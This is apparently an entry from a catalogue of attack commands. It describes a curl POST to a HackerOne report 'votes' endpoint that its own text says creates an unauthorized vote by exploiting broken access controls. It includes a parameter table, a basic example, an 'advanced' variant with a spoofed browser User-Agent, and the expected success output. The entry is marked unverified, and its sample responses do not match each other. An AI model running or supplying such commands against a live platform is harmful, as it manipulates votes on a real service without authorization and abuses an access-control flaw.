---
id: cmd-uuid-1
data: >-
  curl -X POST https://hackerone.com/reports/[Report_ID]/votes -H "Content-Type:
  application/json" -d '{"vote": true}'
tags:
  - http-post
  - vote-creation
type: command
output: |-
  HTTP/1.1 201 Created
  {"success": true, "vote_id": "123"}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.011Z'
verified: false
validated: true
submitted: true
---
# curl-create-vote

## Command

```bash
curl -X POST https://hackerone.com/reports/[Report_ID]/votes -H "Content-Type: application/json" -d '{"vote": true}'
```

## Description

This command sends a POST request to create an unauthorized vote on a HackerOne Hacktivity report, exploiting broken access controls. Replace [Report_ID] with the target report's ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://hackerone.com/reports/[Report_ID]/votes` | Target endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{"vote": true}'` | JSON payload for upvote | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/reports/12345/votes -H "Content-Type: application/json" -d '{"vote": true}'
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/reports/12345/votes -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"vote": true, "reason": "test"}'
```

## Expected Output

Successful response: HTTP 201 Created with JSON like {"success": true, "vote_id": "abc123"}, indicating vote creation.

## Related

- [[commands/curl-delete-vote]]
